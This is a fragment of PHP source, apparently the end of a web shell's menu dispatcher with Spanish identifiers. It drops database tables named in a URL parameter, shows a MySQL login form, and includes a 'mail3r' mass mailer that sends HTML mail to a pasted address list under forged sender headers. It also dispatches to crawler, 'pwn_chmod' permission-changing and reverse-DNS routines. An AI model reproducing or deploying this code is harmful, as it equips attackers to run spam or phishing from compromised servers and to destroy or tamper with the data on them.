			drop_tb($_GET['tbname'],$_GET['tbname']);
		}
		else {
			echo $lenguaje[81];
		}
	}
	elseif ($id_menu=='mysql_login') {
		login_form_mysql();
	}
	elseif ($id_menu=='mail3r') {
		if (!$_POST) {
			form_mailer();
		}
		else {
			form_mailer();
			$paratal_emails = split("\n", $_POST['maillist']);
			$count_emails = count($paratal_emails);
			for($x=0; $x<$count_emails; $x++) {
				$para = $paratal_emails[$x];
				if ($para) {
					$contenido = ereg_replace("&email&", $para, $_POST['contenido']);
					$titulo = ereg_replace("&email&", $para, $_POST['titulo']);
				 	$header  = "From: $_POST[nombre] <$_POST[email]>\r\n";
				 	$header .= "MIME-Version: 1.0\r\n";
				 	$header .= "Content-Type: text/html\r\n";
				 	$header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
				 	$header .= "$contenido\r\n";
				 	if(mail($para, $titulo, "", $header)) {
				 		print '<b>'.$para.'</b> -->> '.$lenguaje[82].'<br />';
				 	}
				 	else {
				 		echo '<b>'.$para.'</b> -->> '.$lenguaje[83].'<br />';
				 	}
				}
				flush();
				ob_flush();
			}
			echo 'Fin :D';
		}
	}
	elseif ($id_menu=='crawl3r') {
		crawl3r();
	}
	elseif (($id_menu=='pwn_chmod') && (isset($_GET['pwnd']))) {
		pwn_chmod($_GET['pwnd']);
	}
	elseif ($id_menu=='reverse_dns') {
		reverse_dns();
	}
?>